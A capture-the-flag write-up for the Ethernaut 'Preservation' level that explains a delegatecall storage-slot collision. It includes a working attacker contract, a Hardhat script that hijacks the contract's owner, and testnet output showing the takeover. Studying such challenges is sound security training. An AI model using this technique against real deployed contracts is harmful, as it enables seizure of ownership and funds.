---
title: "Ethernaut #16 Preservation"
tags: [ethernaut]
style: border
color: primary
description: Ethernaut Preservation challenge writeup
---

## Preservation

### Challenge

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

* Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
* Understanding what it means for `delegatecall` to be context-preserving.
* Understanding how storage variables are stored and accessed.
* Understanding how casting works between different data types.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

### Background

In order to pass this challenge we need to understand that when we `delegatecall` a to some smart contract, the code is executing in the context of the current contract. So when the first slot is being overwritten, it is the first slot in the caller contract and not the callee contract.

### Attack

The `setFirstTime` and `setSecondTime` functions are not used safly here. In fact they are implemented completly wrong and will not function as intended. Normaly when any of the two is called, they will try to update the `storedTime` in there own contract which happens to be in the first slot in storage. However, since they are being `delegatecall`ed, they will actually run in the context of the caller, and hence overwrite the parents first slot in storage. This will result in updating the `timeZone1Library` address. Using this techinque we can make the address point to an attacker controlled contract.

Create a contract that implements a function with the same signature as the `setTime` function, more specifically the signature should be `setTime(uint256)`. This function should have the functionality to replace the third slot with whatever owner we want to set. Then we need to use the original `setTime` function to replace the first slot, which is in fact the address of the contract that is being called.

* Create a contract that:
  * will have a function with the signature `setTime(uint256)`
  * the function `setTime(uint256)` will replace replace the third slot with whatever the argument passed is 
* Call the `setFirstTime` or `setSecondTime` with the address of the attacker controlled contract
* Call the `setFirstTime` with the address of the new owner to be set

#### PreservationSolve.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.4;

contract PreservationSolve {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    constructor() public {}

    function setTime(uint256 _owner) public {
        owner = address(_owner);
    }
}
```

#### preservation-solve.js

```javascript
const hre = require("hardhat");
const { ethers, upgrades } = require("hardhat");

async function main() {
    preservationAddress = "0x06f5b34b422ee5E774b91C5908f0f60E080C4DFb";
    contract = await ethers.getContractAt("Preservation", preservationAddress);

    const accounts = await hre.ethers.getSigners();
    account = accounts[0];

    PreservationSolve = await ethers.getContractFactory("PreservationSolve");
    preservationSolve = await PreservationSolve.deploy();
    await preservationSolve.deployed();

    console.log("Level address   : " + contract.address)
    console.log("Contract Owner  : " + await contract.owner())

    // call setFirstTime and overwrite the first slot in the caller contract
    tx = await contract.connect(account).setFirstTime(preservationSolve.address)
    receipt = await tx.wait()

    // call setFirstTime and overwrite the owner slot in the caller contract
    tx = await contract.connect(account).setFirstTime(account.address)
    receipt = await tx.wait()

    console.log("Contract Owner  : " + await contract.owner())
    
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

```bash
$ npx hardhat run scripts/preservation-solve.js --network rinkeby
Level address   : 0x06f5b34b422ee5E774b91C5908f0f60E080C4DFb
Contract Owner  : 0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F
Contract Owner  : 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
```

### Success Message

Next time, those friends will request an audit before depositing any money on a contract. Congrats!

Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.

Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, `msg.value` will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple `delegatecall`s to a function that looks safe on its own could lead to unwanted transfers of ETH, as `delegatecall`s keep the original `msg.value` sent to the contract.

Move on to the next level when you're ready!
